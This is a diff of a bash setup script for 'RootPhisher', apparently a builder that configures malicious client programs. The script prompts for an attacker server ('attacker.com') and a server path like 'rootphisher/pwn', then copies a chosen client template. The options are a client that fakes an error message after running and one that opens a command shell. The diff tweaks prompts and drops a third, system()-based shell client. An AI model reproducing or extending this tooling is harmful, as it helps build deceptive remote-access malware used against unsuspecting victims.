@@ -1,6 +1,6 @@
 #!/bin/bash
 clear
-cat files/banner
+cat files/banner # shows baner
 echo ""
 echo "Welcome to RootPhisher"
 echo "Press any key to start..."
@@ -9,8 +9,9 @@ echo ""
 echo ""
 echo "[i] Follow the options to configure the client."
 echo ""
-echo "Eg.: /root"
-echo -n "[=] Path to generate the client: "
+pwds=$(pwd)
+echo "Current: $pwds"
+echo -n "[=] Path to generate the client: " # path to generate
 read path
 echo ""
 echo ""
@@ -19,12 +20,12 @@ echo -n "[=] Name for the file: "
 read name
 echo ""
 echo ""
-echo "Eg.: attacker.com"
-echo -n "[=] Your server: "
+echo "Eg.: attacker.com, ONLY SERVER!"
+echo -n "[=] Your server : "
 read server
 echo ""
 echo ""
-echo "Eg.: rootphisher"
+echo "Eg.: if the path is 'attacker.com/rootphisher/pwn', type 'rootphisher/pwn'"
 echo "(Without '/')"
 echo "If it is '/' leave it in blank"
 echo -n "[=] Server Path: "
@@ -46,8 +47,6 @@ echo "1) Error_Msg_Client => After the execution, shows you an error saying soft
 echo ""
 echo "2) Cmd_Prompt_Client => After the execution, open a very simple command shell line."
 echo ""
-echo "3) Shell_Type_Client => Only use this if the other clients are not working, this client uses only shell commands with system(); instead of C functions."
-echo ""
 echo ""
 echo "Enter the number of the option do you want."
 echo ""
@@ -62,11 +61,6 @@ cp files/Error_Msg_Client.c .client
 2) echo "[*] Selected: $opt [ Cmd_Prompt_Client ]";
 cp files/Cmd_Prompt_Client.c .client
 ;;
-
-3) echo "[*] Selected: $opt [ Shell_Type_Client ]";
-cp files/Shell_Type_Client.c .client
-;;
-
 
 *) echo "$opt does not exists";
 echo "Press enter to exit ...";
